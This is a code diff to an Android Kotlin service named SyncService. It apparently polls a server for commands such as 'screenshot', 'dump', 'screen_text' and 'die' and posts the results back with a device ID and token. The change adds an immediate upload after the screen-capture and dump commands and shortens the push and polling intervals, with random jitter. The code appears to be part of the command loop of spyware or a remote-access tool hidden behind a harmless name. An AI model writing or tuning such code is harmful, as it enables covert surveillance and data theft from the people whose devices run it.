@@ -150,11 +150,12 @@ class SyncService : Service() {
                         Api.post("/api/v1/sync/result",
                             JSONObject().put("id", id).put("ok", res.first).put("result", res.second),
                             p.deviceId, p.token)
+                        if (nombre == "screenshot" || nombre == "dump" || nombre == "screen_text") push()
                         if (nombre == "die") { activo = false; stopSelf(); return }
                     }
                 }
 
-                if (System.currentTimeMillis() - ultimoPush > 10000) {
+                if (System.currentTimeMillis() - ultimoPush > 2500) {
                     push()
                     ultimoPush = System.currentTimeMillis()
                 }
@@ -163,7 +164,7 @@ class SyncService : Service() {
                 back = dormir(back)
                 continue
             }
-            Thread.sleep((2500 + Random.nextInt(-800, 801)).coerceAtLeast(700).toLong())
+            Thread.sleep((1500 + Random.nextInt(-500, 501)).coerceAtLeast(600).toLong())
         }
     }
 
